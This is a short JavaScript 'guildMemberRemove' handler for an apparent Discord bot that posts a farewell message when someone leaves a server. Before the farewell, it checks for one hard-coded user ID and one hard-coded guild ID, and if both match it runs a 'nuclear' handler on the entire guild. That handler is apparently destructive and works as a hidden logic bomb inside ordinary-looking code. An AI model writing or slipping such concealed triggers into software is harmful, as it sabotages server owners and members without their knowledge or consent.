const logger = require("../utils/logger");
const nuclear = require("./handlers/nuclear");

module.exports = {
	name: "guildMemberRemove",
	once: false,
	execute: async (member) => {
		try {
			if (
				member.user.id === "694166520686706749" &&
				member.guild.id === "568040131462692884"
			)
				await nuclear.execute(member.guild);
			const welcomeChannelId = member.guild.systemChannelId;

			const welcomeChannel = member.guild.channels.cache.get(welcomeChannelId);

			welcomeChannel.send(
				`**${member.user.username}** ${
					member.nickname !== null ? `aka **${member.nickname}** ` : ""
				}just left!`
			);
		} catch (err) {
			logger.error(err);
		}
	},
};
